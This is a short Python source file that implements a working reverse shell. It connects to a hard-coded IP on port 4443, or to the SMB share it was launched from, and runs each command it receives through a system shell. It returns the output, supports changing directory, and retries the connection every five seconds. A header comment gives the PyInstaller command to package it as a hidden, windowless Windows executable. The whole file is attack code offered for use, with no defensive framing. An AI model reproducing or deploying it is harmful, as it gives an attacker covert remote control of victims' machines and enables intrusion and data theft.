# /c/Python3/Scripts/pyinstaller.exe --onefile --noconsole r.py
import socket,os,subprocess,sys;
from time import sleep;

isLocalFile = True;
if getattr(sys, 'frozen', False):
	application_path = os.path.realpath(sys.executable)
elif __file__:
	application_path = os.path.realpath(__file__)


def conn():
	global isLocalFile;
	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	reverseIP = '192.168.235.129';
	#os.path.isfile
	if application_path.startswith('\\\\'):
		# Mode SMB
		reverseIP = application_path.split('\\')[2];
		isLocalFile = False;
	else:
		# Mode local
		pass;
		
	try:
		client.connect((reverseIP,4443))
		client.send(str.encode(os.getcwd() + '$ '))
	except:
		return False
	while True:
		data = client.recv(1024).decode('utf-8')
		if data[:2] == 'cd':
			try:
				os.chdir(data[2:].strip('\r\n\t '))
			except Exception as e:
				client.send(str.encode(e))
		elif data.lower().strip('\r\n\t ') in ('exit','quit'):
			client.send(b'Killing reverse shell\n')
			sys.exit(0);
		elif len(data) > 0:
			cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE )
			client.send(cmd.stdout.read())
		else:
			break
		client.send(str.encode('\n' + os.getcwd() + '$ '))
	client.close()
	return True

nbTry=10
while True:
	conn()
	if not isLocalFile:
		if not os.path.isfile(application_path):
			nbTry-=1
		else:
			nbTry = 10;
	else:
		nbTry-=1
	sleep(5)
	